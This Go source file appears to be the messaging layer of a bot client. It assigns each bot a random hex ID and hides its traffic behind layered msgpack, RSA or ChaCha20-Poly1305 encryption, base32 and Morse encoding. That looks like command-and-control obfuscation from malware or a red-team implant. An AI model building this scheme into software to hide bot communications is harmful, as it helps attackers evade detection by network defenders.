package message

import (
	"bot/morse"
	"bytes"
	"encoding/base32"
	"github.com/vmihailenco/msgpack"
	r "math/rand"
	"strings"
	"time"
)

const (
	UidLength     = 16
	letterBytes   = "0123456789abcdef"
	letterIdxBits = 6                    // 6 bits to represent a letter index
	letterIdxMask = 1<<letterIdxBits - 1 // All 1-bits, as many as letterIdxBits
	letterIdxMax  = 63 / letterIdxBits   // # of letter indices fitting in 63 bits
)

var (
	src = r.NewSource(time.Now().UnixNano())
)

// GenerateRandomUid generates a random hexadecimal string
// of length 16 used to identify the bot
func (b *Bot) GenerateRandomUid() {
	sb := strings.Builder{}
	sb.Grow(UidLength)
	// A src.Int63() generates 63 random bits, enough for letterIdxMax characters!
	for i, cache, remain := UidLength-1, src.Int63(), letterIdxMax; i >= 0; {
		if remain == 0 {
			cache, remain = src.Int63(), letterIdxMax
		}
		if idx := int(cache & letterIdxMask); idx < len(letterBytes) {
			sb.WriteByte(letterBytes[idx])
			i--
		}
		cache >>= letterIdxBits
		remain--
	}
	b.Uid = sb.Bytes()
	return
}

//unmarshal uses msgpack to unmarshal the data
func (b *Bot) unmarshal(data []byte) {
	enc := msgpack.NewDecoder(bytes.NewBuffer(data))
	err := enc.Decode(&b)
	if err != nil {
		panic(err)
	}
	return
}

//DeobfuscateData deobfuscates the data in the following order :
// 1. Convert encoder data to base32 encoded data
// 2. Convert base32 encoded data to RSA or ChaChaPoly1305 encrypted data
// 3. Convert RSA encrypted data to the marshaled data
// 4. Convert the marshaled data to the original data (Bot)
func (b *Bot) DeobfuscateData(data []byte) {
	var encodedData []byte = morse.Decode(string(data))
	encryptedData, err := base32.StdEncoding.DecodeString(string(encodedData))
	if err != nil {
		panic(err)
	}
	b.unmarshal(DecryptCCP(encryptedData))
	return
}

//marshal uses msgpack to marshal the data
func (b *Bot) marshal() []byte {
	var buf bytes.Buffer
	enc := msgpack.NewEncoder(&buf).StructAsArray(true)
	err := enc.Encode(&b)
	if err != nil {
		panic(err)
	}
	return buf.Bytes()
}

//ObfuscateData obfuscates the data in the following order :
// 1. Convert the data to the marshaled data
// 2. Convert the marshaled data to RSA or ChaChaPoly1305 encrypted data
// 3. Convert RSA encrypted data to base32 encoded data
// 4. Convert base32 encoded data to encoder data
func (b *Bot) ObfuscateData() []byte {
	var encryptedData []byte
	if !FirstConnection { // edode : CCP encryption
		var marshalledData = b.marshal()
		encryptedData = EncryptCCP(marshalledData)
	} else { // edode : RSA encryption
		encryptedData = EncryptData(b.marshal())
		FirstConnection = false
	}
	var encoded_data = base32.StdEncoding.EncodeToString(encryptedData)
	return morse.Encode(encoded_data)
}
